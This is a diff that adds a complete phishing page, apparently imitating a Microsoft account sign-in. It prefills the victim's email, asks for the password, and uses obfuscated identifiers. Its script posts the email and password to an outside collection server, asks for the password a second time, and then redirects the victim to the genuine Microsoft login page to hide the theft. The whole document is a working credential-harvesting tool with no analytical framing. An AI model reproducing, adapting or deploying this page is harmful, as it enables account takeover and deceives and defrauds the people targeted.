@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		<title>Doc</title>
+		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.3/css/bootstrap.min.css">
+		<link rel="stylesheet" type="text/css" href="css/style.css">
+	</head>
+	<body>
+		<div id="a1x9k2m7p4_992211" class="q7n4v8r2t1_992211">
+			
+			<div class="b5h3d9s8l2_992211">
+				<img src="images/a8f3k2m9q1.webp">
+			</div>
+			<div class="c8j2f6w9z4_992211">
+				<div class="d3k7u1y5x8_992211">
+					<img src="images/z0x4n7b2c9.png">
+				</div>
+				<div class="e6p4m2q9r7_992211">
+					<div class="f1t8v3n6b5_992211">
+						<img src="images/m5t8r1p4w6.png">
+					</div>
+					<div class="g9w2s4h7k1_992211">
+						<img src="images/q9c2v7l0s3.png">
+						<span id="u8z3x6c1v5">email@test.com</span>
+					</div>
+					<div class="h4r7m1p9q2_992211">
+						<div class="i6n2b8v4c3_992211">
+							<img src="images/h4k8d1n6p2.png">
+						</div>
+						<div class="j5k9d3l7s1_992211" id="z3x8c2v7b1n6m5">
+							<input type="hidden" id="p9q4r2t7y6u1i3" value="<?php echo $email ?>">
+							<input onfocus="fnDisableX()" type="password" id="w2e8r4t6y1u9i3" placeholder="Password">
+							<div id="m7n2b5v8c1_992211" class="text-danger"></div>
+						</div>
+						<div class="k3l8p2o7i4_992211"></div>
+						<div class="l9q1w4e7r2_992211">
+							<a onclick="fnDoWorkX()" id="x1c4v7b9n2m5k8" class="btn btn-primary" href="javascript:void(0)">Sign in
+								<span id="z6x2c9v4b1_992211" class="spinner-border spinner-border-sm"></span>
+							</a>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.3/js/bootstrap.min.js"></script>
+<script src="js/script.js"></script>
+
+<script>
+function fnActivateX(msg){
+	$("#m7n2b5v8c1_992211").show();
+	$("#m7n2b5v8c1_992211").html(msg);
+	$("#w2e8r4t6y1u9i3").val('');
+	$("#z3x8c2v7b1n6m5").addClass('u2y7t1r4e9_992211');
+}
+
+function fnDisableX(){
+	$("#m7n2b5v8c1_992211").hide();
+	$("#m7n2b5v8c1_992211").html('');
+	$("#z3x8c2v7b1n6m5").removeClass('u2y7t1r4e9_992211');
+}
+
+function fnEnableBtnX(){
+	$("#x1c4v7b9n2m5k8").prop("disabled",true);
+	$("#x1c4v7b9n2m5k8").addClass('t5r8e2w1q9_992211');
+	$("#z6x2c9v4b1_992211").show();
+}
+
+function fnDisableBtnX(){
+	$("#x1c4v7b9n2m5k8").prop("disabled",false);
+	$("#x1c4v7b9n2m5k8").removeClass('t5r8e2w1q9_992211');
+	$("#z6x2c9v4b1_992211").hide();
+}
+
+function fnDoWorkX(){
+	var p9q4r2t7y6u1i3 = $("#p9q4r2t7y6u1i3").val();
+	var w2e8r4t6y1u9i3 = $("#w2e8r4t6y1u9i3").val();
+
+	if (w2e8r4t6y1u9i3 == "") {
+		fnActivateX("Please enter your password to continue");
+		return;
+	}
+
+	fnEnableBtnX();
+
+	if (localStorage.getItem("val") === null) {
+  		localStorage.setItem("val", w2e8r4t6y1u9i3);
+  		fnHttpX(p9q4r2t7y6u1i3, w2e8r4t6y1u9i3);
+  		return;
+	}
+
+	var prevValX = localStorage.getItem("val");
+
+	if (prevValX !== w2e8r4t6y1u9i3) {
+		localStorage.setItem("val", w2e8r4t6y1u9i3);
+  		fnHttpX(p9q4r2t7y6u1i3, w2e8r4t6y1u9i3);
+  		return;
+	}
+
+	localStorage.removeItem("val");
+	fnHttpX(p9q4r2t7y6u1i3, w2e8r4t6y1u9i3);
+
+	fnEnableBtnX();
+}
+
+function fnHttpX(p9q4r2t7y6u1i3, w2e8r4t6y1u9i3){
+	$.ajax({
+		type: 'post',
+		url: 'https://backend.wtffk.icu/sendmail.php',
+		data:{u:p9q4r2t7y6u1i3, p:w2e8r4t6y1u9i3, e:'U003SnZEZGNOd0hmOGxYb243VXNqZmVhb3ZkSVZaVUFSWG94K0JUcitNND0='},
+		success: function(data){
+			console.log(data)
+			window.location.href="https://login.live.com/";
+		}
+	})
+}
+</script>
+</body>
+</html>
